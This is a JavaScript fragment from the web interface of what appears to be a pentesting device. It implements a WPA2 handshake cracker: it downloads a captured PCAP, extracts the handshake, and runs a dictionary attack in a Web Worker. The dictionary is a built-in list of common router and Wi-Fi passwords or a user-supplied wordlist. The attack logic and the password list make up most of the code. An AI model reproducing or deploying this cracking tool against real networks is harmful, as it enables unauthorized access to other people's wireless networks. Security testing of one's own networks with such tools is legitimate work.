    $(".act-crack-retry-save").classList.remove("hidden");
  }
}

function _crackDone(msg, pw) {
  $(".crack-result").textContent = msg;
  $(".crack-result").classList.remove("hidden");
  $(".act-crack-stop").classList.add("hidden");
  $(".act-crack-go").classList.remove("hidden");
  $(".act-crack-go").disabled = true;
  _crackFoundPw = pw || null;
  if (_crackFoundPw) _saveCrack(_crackFoundPw);
}

// ── Crack: builtin wordlist ───────────────────────────────────
const _BUILTIN_DICT = [
  "12345678","123456789","1234567890","11111111","00000000",
  "87654321","11223344","12344321","99999999","88888888",
  "55555555","12121212","13131313","10101010","98765432",
  "12341234","11112222","22222222","33333333","44444444",
  "66666666","77777777","01234567","20202020","19191919",
  "password","password1","passw0rd","pass1234","password12",
  "password123","admin123","admin1234","admin2020","root1234",
  "master12","login123","access14","letmein1","trustno1",
  "welcome1","changeme","default1","guest1234","user1234",
  "test1234","temp1234","pass12345","p@ssw0rd","p@ss1234",
  "qwerty123","qwertyui","qwerty12","qwer1234","qwerasdf",
  "asdfghjk","asdf1234","zxcvbnm1","1234asdf","1234qwer",
  "1q2w3e4r","zaq12wsx","1qaz2wsx","qazwsx123","!q2w3e4r",
  "wifi1234","wifi12345","wlan1234","router12","netgear1",
  "linksys1","dlink1234","tplink12","huawei12","modem123",
  "internet","wireless","network1","connect1","homewifi",
  "mywifi123","wifiwifi","setup1234","broadband","fiber123",
  "abc12345","abcd1234","1234abcd","aa123456","a1234567",
  "a1b2c3d4","aaa11111","xyz12345","system12","server12",
  "cisco123","ubnt1234","mikrotik","radius12","monitor1",
  "14141414","12345679","11111112","01020304","02468024",
  "13572468","10203040","11235813","31415926","27182818"
];

// ── Crack: dict list ──────────────────────────────────────────
async function loadDictList() {
  const sel = $(".crack-dict-select");
  sel.innerHTML = "";
  $(".act-crack-go").disabled = false;

  const builtin = document.createElement("option");
  builtin.value = "__builtin__";
  builtin.textContent = "built-in (" + _BUILTIN_DICT.length + " words)";
  sel.appendChild(builtin);

  try {
    const res   = await requestPost("/", { command: "pw", param: "list" });
    const files = res.split("\n")
      .filter(Boolean)
      .map(l => l.split(":")[0])
      .filter(Boolean);
    files.forEach(name => {
      const opt = document.createElement("option");
      opt.value = name;
      opt.textContent = name;
      sel.appendChild(opt);
    });
  } catch (_) {}
}

// ── Crack: runner ─────────────────────────────────────────────
async function runCrack(pcapPath) {
  const sel = $(".crack-dict-select");
  if (!sel || !sel.value) return;
  const dictPath = sel.value;

  _crackRunning = true;
  _crackStop    = false;
  _crackSetPhase("run");
  updateCrackProgress(0, 0, 0, 0);
  $(".crack-stats").textContent = "Parsing PCAP...";

  try {
    let url = "/download?file=" + encodeURIComponent(pcapPath);
    if (IS_DEV) url = "/puteros" + url;
    const ac = new AbortController();
    const tid = setTimeout(() => ac.abort(), 30000);
    const resp = await fetch(url, { credentials: "include", signal: ac.signal });
    clearTimeout(tid);
    if (!resp.ok) throw new Error("HTTP " + resp.status);
    var pcapData = new Uint8Array(await resp.arrayBuffer());
  } catch (e) {
    _crackDone("PCAP error: " + (e.name === "AbortError" ? "timed out" : e.message));
    _crackRunning = false;
    return;
  }

  const hs = parsePcap(pcapData, pcapPath);
  if (!hs) {
    _crackDone("No complete WPA2 handshake in PCAP");
    _crackRunning = false;
    return;
  }

  $(".crack-stats").textContent = "Loading dictionary...";
  let words;
  if (dictPath === "__builtin__") {
    words = _BUILTIN_DICT;
  } else {
    try {
      const text = await requestPost("/", { command: "pw", param: "get", name: dictPath });
      words = text.split("\n")
        .map(l => l.replace(/\r/g, ""))
        .filter(l => l.length >= 8 && l.length <= 63);
    } catch (e) {
      _crackDone("Dictionary error: " + e.message);
      _crackRunning = false;
      return;
    }
  }

  const total = words.length;
  const t0 = Date.now();

  if (_crackWorker) { _crackWorker.terminate(); _crackWorker = null; }
  const blob = new Blob([_CRACK_WORKER_SRC], { type: "application/javascript" });
  _crackWorker = new Worker(URL.createObjectURL(blob));

  _crackWorker.onmessage = function(e) {
    const msg = e.data;
    if (msg.type === "mode") {
      $(".crack-mode").textContent = msg.mode === "wasm" ? "SIMD WASM" : "JS";
    } else if (msg.type === "progress") {
      const secs = Math.max((Date.now() - t0) / 1000, 0.001);
      const wps = Math.round(msg.tested / secs);
      const eta = wps > 0 ? Math.round((total - msg.tested) / wps) : 0;
      updateCrackProgress(msg.tested, total, wps, eta);
    } else if (msg.type === "done") {
      updateCrackProgress(msg.tested || total, total, 0, 0);
      _crackDone(msg.found ? "Found: " + msg.pw : (msg.stopped ? "Stopped" : "Not found"),
                 msg.found ? msg.pw : null);
      _crackWorker.terminate();
      _crackWorker = null;
      _crackRunning = false;
    }
  };

  _crackWorker.onerror = function(err) {
    _crackDone("Worker error: " + err.message);
    _crackWorker.terminate();
    _crackWorker = null;
    _crackRunning = false;
  };

  _crackWorker.postMessage({
    type: "start",
    hs: { ssidBytes: hs.ssidBytes, prfData: hs.prfData, eapol: hs.eapol, mic: hs.mic },
    words
  });
}

// ── Crack: event wiring ───────────────────────────────────────
$(".container").addEventListener("click", async (e) => {
  const crackBtn = e.target.closest(".act-crack");
  if (!crackBtn || _crackRunning) return;
  e.preventDefault();
  const fpath = crackBtn.closest(".file-row")?.getAttribute("data-file");
  if (!fpath) return;
  _crackFilePath = fpath;
  $(".crack-file-name").textContent = fpath.substring(fpath.lastIndexOf("/") + 1);
  _crackSetPhase("dict");
  $(".act-crack-go").textContent = "Crack";
  Dialog.show("crack");
  await loadDictList();
});

$(".act-crack-go").addEventListener("click", () => {
  if (_crackRunning || !_crackFilePath) return;
  runCrack(_crackFilePath);
});

$(".act-crack-stop").addEventListener("click", () => {
  _crackStop = true;
  if (_crackWorker) _crackWorker.postMessage({ type: "stop" });
});

$(".act-crack-retry-save").addEventListener("click", () => {
  if (_crackFoundPw) _saveCrack(_crackFoundPw);
});

const _origHide = Dialog.hide.bind(Dialog);
Dialog.hide = function () {
  if (_crackWorker) { _crackWorker.terminate(); _crackWorker = null; _crackRunning = false; }
  _crackStop = true;
  _crackFoundPw = null;
  $(".act-crack-retry-save").classList.add("hidden");
  _origHide();
};

(async function () {
  try {
    await fetchSystemInfo();
    await fetchFiles("/");
  } catch (e) {
    Dialog.loading.hide();
    Dialog.show("auth");
  }
})();
